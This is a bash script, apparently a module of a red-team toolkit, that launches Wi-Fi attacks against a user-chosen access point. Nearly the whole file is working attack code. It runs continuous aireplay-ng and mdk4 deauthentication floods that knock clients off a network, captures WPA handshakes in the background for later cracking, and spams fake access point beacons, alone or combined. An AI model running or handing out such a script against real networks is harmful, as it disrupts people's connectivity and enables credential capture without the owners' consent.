#!/usr/bin/env bash
# HZ_NAME=Advanced Red Team RF Disruption & Deauth Suite
# HZ_DESC=Performs high-entropy deauth floods, automated client discovery, handshake capture, and fake AP beacon spam.
# HZ_VERSION=2.0.0
# HZ_AUTHOR=Higer23 & Advanced Cyber Lab

set -euo pipefail

# Cleanup handler for safe background process termination
cleanup_deauth_ops() {
    echo -e "\n${YELLOW}[*] Cleaning up background Red Team processes and flushing network states...${NC}"
    kill 0 2>/dev/null || true
    log_event "INFO" "Red Team RF Disruption module terminated safely and processes cleaned."
}

module_main() {
    trap cleanup_deauth_ops INT TERM EXIT

    print_banner
    echo -e "${RED}[RED TEAM MODULE] Advanced RF Disruption, Deauth & Beacon Flood Suite${NC}"
    echo -e "${WHITE}Executes high-intensity stress testing, automated client harvesting, and spectrum pollution.${NC}"
    log_event "INFO" "Initializing Advanced Red Team RF Disruption & Deauth Suite."

    # Check interface and monitor mode status
    local target_iface="${LAB_INTERFACE:-wlan0mon}"
    echo -e "${YELLOW}[*] Active wireless interface: $target_iface${NC}"

    # Verify root / capability
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[ERROR] Red Team operations require root privileges (sudo).${NC}"
        log_event "ERROR" "Non-root execution attempted for Red Team module."
        return 1
    fi

    # Dependency validation
    for tool in aireplay-ng mdk4 airodump-ng iwconfig tcpdump; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}[ERROR] Required tool '$tool' is not installed.${NC}"
            log_event "ERROR" "Missing dependency: $tool"
            return 1
        fi
    done

    # Target configuration
    if [ -z "${TARGET_BSSID:-}" ]; then
        read -r -p "Enter Target BSSID (Access Point MAC): " TARGET_BSSID
    fi

    if [ -z "${TARGET_CHANNEL:-}" ]; then
        read -r -p "Enter Target Channel (e.g., 6): " TARGET_CHANNEL
    fi

    # Lock channel securely
    echo -e "${YELLOW}[*] Locking interface $target_iface to channel $TARGET_CHANNEL...${NC}"
    iwconfig "$target_iface" channel "$TARGET_CHANNEL" 2>/dev/null || true

    echo ""
    echo "Select Red Team Tactical Attack Vector:"
    echo "1. Targeted Client Deauth Flood + Background Handshake Capture"
    echo "2. Broadcast Mass Deauth Disruption (MDK4 Mode d)"
    echo "3. Fake AP Beacon Flood / Spectrum Pollution Spam (MDK4 Mode b)"
    echo "4. Comprehensive Full-Spectrum Red Team Campaign (Deauth + Beacon Chaos)"
    read -r -p "Select tactical option (1-4): " attack_choice
    log_event "INFO" "Red Team attack vector chosen option: $attack_choice"

    local timestamp
    timestamp=$(date +%s)
    local capture_prefix="${CAPTURE_DIR}/redteam_session_${timestamp}"
    local handshake_pcap="${capture_prefix}_handshake.pcap"
    local telemetry_json="${capture_prefix}_telemetry.json"
    
    HIGERZERO_SESSION_METRICS["redteam_pcap"]="$handshake_pcap"
    HIGERZERO_SESSION_METRICS["redteam_telemetry"]="$telemetry_json"

    case "$attack_choice" in
        1)
            echo -e "${YELLOW}[*] Initializing background packet capture for handshake telemetry...${NC}"
            airodump-ng --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" -w "$capture_prefix" "$target_iface" &
            AIRODUMP_PID=$!

            read -r -p "Enter Target Client MAC (Leave blank for full AP broadcast): " target_client
            echo -e "${GREEN}[+] Launching targeted deauth stream against BSSID: $TARGET_BSSID${NC}"
            log_event "SUCCESS" "Starting aireplay-ng deauth attack against BSSID: $TARGET_BSSID"

            if [ -n "${target_client:-}" ]; then
                echo -e "${YELLOW}[*] Targeting isolated client: $target_client${NC}"
                aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$target_client" "$target_iface"
            else
                echo -e "${YELLOW}[*] Broadcasting deauth frames to all associated clients...${NC}"
                aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$target_iface"
            fi
            ;;
        2)
            echo -e "${GREEN}[+] Launching MDK4 Mass Deauth Flood (Mode d) against BSSID: $TARGET_BSSID${NC}"
            log_event "SUCCESS" "Starting MDK4 mass deauth flood against $TARGET_BSSID."
            mdk4 "$target_iface" d -B "$TARGET_BSSID"
            ;;
        3)
            echo -e "${YELLOW}[*] Configuring Beacon Flood (Fake AP Spectrum Pollution)...${NC}"
            read -r -p "Enter custom base SSID prefix for spam (default: Corp_Guest_): " custom_prefix
            local prefix="${custom_prefix:-Corp_Guest_}"
            
            echo -e "${GREEN}[+] Launching MDK4 Beacon Flood (Mode b) generating high-entropy fake access points...${NC}"
            log_event "SUCCESS" "Starting MDK4 beacon flood with prefix: $prefix"
            
            # Using mdk4 mode b with random/custom SSID generation
            mdk4 "$target_iface" b -n "$prefix" -s 50
            ;;
        4)
            echo -e "${GREEN}[+] Launching Comprehensive Full-Spectrum Red Team Campaign...${NC}"
            log_event "SUCCESS" "Initiating dual-vector MDK4 deauth and beacon flood campaign."
            
            # Launch background beacon flood
            mdk4 "$target_iface" b -n "SecOps_Trap_" -s 30 &
            
            # Launch main deauth disruption
            mdk4 "$target_iface" d -B "$TARGET_BSSID"
            ;;
        *)
            echo -e "${YELLOW}[WARN] Invalid tactical option selected. Aborting operation.${NC}"
            log_event "WARN" "Invalid option provided in Red Team module."
            return 1
            ;;
    esac

    echo -e "${GREEN}[SUCCESS] Red Team operation executed successfully.${NC}"
    log_event "SUCCESS" "Red Team module session completed."
    sleep 2
}

# Module registration hook for HigerZero Zero-Registry
[[ "${BASH_SOURCE[0]}" == "${0}" ]] && module_main "$@"
